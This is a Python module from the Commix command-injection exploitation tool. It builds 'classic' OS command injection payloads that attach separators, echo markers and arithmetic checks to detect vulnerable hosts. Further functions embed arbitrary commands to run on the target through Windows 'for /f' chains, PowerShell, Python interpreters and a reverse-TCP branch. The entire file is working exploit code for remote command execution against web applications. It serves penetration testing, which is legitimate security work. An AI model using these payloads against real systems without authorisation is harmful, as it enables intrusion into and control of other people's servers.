#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks

"""
The classic injection technique on Classic OS Command Injection.
The available "classic" payloads.
"""

"""
Classic decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    if settings.SKIP_CALC:
      payload = (chain +
                "echo " + TAG + TAG + TAG
                )
    else:
      # 'set /p' prints its prompt without a trailing newline, so the marker arrives in one piece.
      payload = (chain +
              "for /f \"tokens=* eol=\" %i in ('cmd /c \"" +
              "set /a (" + str(randv1) + "+" + str(randv2) + ")" +
              "\"') do @" + settings.CMD_NUL + " set /p=" + TAG + "%i" + TAG + TAG
              )
  else:
    if settings.USE_BACKTICKS or settings.WAF_ENABLED:
      math_calc = settings.CMD_SUB_PREFIX + "expr " + str(randv1) + " + " + str(randv2) + settings.CMD_SUB_SUFFIX
    else:
      math_calc = settings.CMD_SUB_PREFIX + "(" + str(randv1) + "+" + str(randv2) + "))"

    if settings.SKIP_CALC:
      payload = (separator +
                "echo " + TAG +
                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
                )
    else:
      payload = (separator +
                "echo " + TAG +
                math_calc +
                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
                )

    payload = checks.append_custom_marker(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_interpreter(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    if settings.SKIP_CALC:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'+'" + TAG + "'+'" + TAG + "')\""
    else:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'+str(int(" + str(int(randv1)) + "+" + str(int(randv2)) + "))" + "+'" + TAG + "'+'" + TAG + "')\""

    payload = (chain +
              "for /f \"tokens=* eol=\" %i in ('cmd /c " +
              python_payload +
              "') do @" + settings.CMD_NUL + " set /p=%i"
              )
  else:
    if settings.SKIP_CALC:
      payload = (separator +
                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                TAG +
                TAG + "')\""
                )
    else:
      payload = (separator +
                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                "'+str(int(" + str(int(randv1)) + "+" + str(int(randv2)) + "))" + "+'" +
                TAG + "'+'" +
                TAG + "')\""
                )

    payload = checks.append_custom_marker(payload, separator)

  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    if settings.REVERSE_TCP:
      payload = (chain +
                cmd + settings.SINGLE_WHITESPACE
                )
    else:
      payload = (chain +
                "for /f \"tokens=* eol=\" %i in ('cmd /c \"" +
                cmd +
                "\"') do @" + settings.CMD_NUL + " set /p=" + TAG + TAG + "%i" + TAG + TAG
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX 
    payload = (separator +
              "echo " + TAG +
              settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  +
              cmd_exec +
              settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG
              )

    payload = checks.append_custom_marker(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_interpreter(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    if settings.REVERSE_TCP:
      payload = (chain +
                cmd + settings.SINGLE_WHITESPACE
                )
    else:
      # Run through 'cmd /c', or PowerShell would look the command up among its own cmdlets.
      payload = (chain +
                "for /f \"tokens=* eol=\" %i in ('" +
                settings.WIN_PYTHON_INTERPRETER +
                " -c \"import os; os.system('powershell.exe -InputFormat none write-host " +
                TAG + TAG + " $(cmd /c " + cmd + ") "+ TAG + TAG + "')\"" +
                "') do @" + settings.CMD_NUL + " set /p=%i"
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
    payload = (separator +
              settings.LINUX_PYTHON_INTERPRETER + 
              " -c \"print('" + TAG + "'+'" + TAG + "'+'" + settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "'+'" + 
              TAG + "'+'" + TAG + "')\""
              )

    payload = checks.append_custom_marker(payload, separator)

  return payload

# eof
